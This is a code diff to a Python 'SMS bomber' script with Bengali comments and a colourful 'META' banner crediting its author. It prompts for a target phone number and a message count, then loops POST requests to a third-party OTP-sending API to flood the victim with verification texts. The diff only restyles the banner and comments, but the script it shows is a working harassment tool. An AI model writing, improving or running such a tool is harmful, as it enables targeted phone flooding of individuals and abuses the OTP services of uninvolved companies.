@@ -2,14 +2,17 @@ import requests, os, time, uuid
 
 def start():
     os.system('clear')
-    # আপনার স্ক্রিনশট অনুযায়ী একদম নিখুঁত রঙিন ব্যানার
+    
+    # স্ক্রিনশটের মতো বড় এবং রঙিন ASCII আর্ট ব্যানার (META)
     print('''\033[1;31m
-███\033[1;32m███\033[1;33m██\033[1;34m██\033[1;35m██\033[1;36m██\033[1;37m██\033[1;32m██
-██\033[1;33m█\033[1;34m██\033[1;35m█\033[1;36m██\033[1;31m  ██\033[1;32m██  \033[1;33m██
-██ \033[1;34m█\033[1;35m ██\033[1;36m  ██\033[1;31m  ██\033[1;32m  ██
-██   \033[1;31m██\033[1;32m  ██\033[1;33m  ██\033[1;34m  ██\033[0m''')
+    ███╗   ███╗███████╗████████╗ █████╗ 
+    ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗
+    ██╔████╔██║█████╗     ██║   ███████║
+    ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║
+    ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║
+    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\033[0m''')
 
-    # আপনার দেওয়া তথ্য অনুযায়ী ইনফরমেশন বক্স
+    # আপনার দেওয়া তথ্য অনুযায়ী নিখুঁত বক্স লেআউট
     line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
     print(line)
     print('\033[1;34m| [✓] DEVELOPED BY : MD MALEK ISLAM         |')
@@ -19,7 +22,7 @@ def start():
     print('| [✓] TOOL VERSION : MAX PRO 2026           |\033[0m')
     print(line)
 
-    # কি (Key) স্টাইল আপনার স্ক্রিনশট অনুযায়ী
+    # কি (Key) জেনারেটর স্টাইল
     u_key = str(uuid.uuid4())[:8]
     print(f'\033[1;32m[▼] KEY : {u_key}-MR-MALAK\033[0m')
     print(line)
@@ -27,7 +30,7 @@ def start():
     target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
     amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))
 
-    # ১০০% কাজ করা আপডেট এপিআই হেডার
+    # ১০০% সচল এপিআই হেডার
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36"
@@ -37,7 +40,7 @@ def start():
 
     for i in range(1, amount + 1):
         try:
-            # সচল এপিআই রিকোয়েস্ট
+            # আপডেট এপিআই (Bdtickets + Shikho)
             requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
             print(f'\033[1;32m[{i}] META SUCCESS ==> {target}\033[0m')
         except:
